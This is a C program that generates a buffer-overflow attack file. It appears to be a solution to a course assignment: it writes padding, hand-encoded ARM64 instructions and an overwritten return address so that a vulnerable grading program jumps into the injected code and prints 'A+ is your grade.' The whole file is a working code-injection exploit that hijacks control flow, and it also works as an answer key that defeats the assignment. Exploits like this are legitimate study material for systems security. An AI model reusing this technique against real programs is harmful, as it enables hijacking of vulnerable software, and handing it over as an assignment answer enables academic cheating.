#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData1;
    unsigned int uiData2;
    unsigned int uiData3;
    unsigned int uiData4;

    ulData1 = 0x420068; /* address to the instructions below; */
    uiData2 = 0x52800141; /* mov w1, #0x0A */
    uiData3 = 0x10000040; /* adr x0, 0x420074 */
    uiData4 = 0x17FF8201; /* b 0x400874 */

    psFile = fopen("dataAplus", "w");

    /* buf[0-13] */
    fprintf(psFile, "Max and Melody");
    /* buf[14-15] */
    fprintf(psFile, "%c", '\0');
    fprintf(psFile, "%c", '\0');
    /* buf[16-19] */
    fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
    /* buf[20-23] */
    fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
    /* buf[24-27] */
    fwrite(&uiData4, sizeof(unsigned int), 1, psFile);
    /* buf[28-47] */
    fprintf(psFile, "A+ is your grade.");
    fprintf(psFile, "%c", '%');
    fprintf(psFile, "%c", 'c');
    fprintf(psFile, "%c", '\0');
    /* buf[48-55] (x30) */
    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    fprintf(psFile, "%c", '\n');
    return 0;
}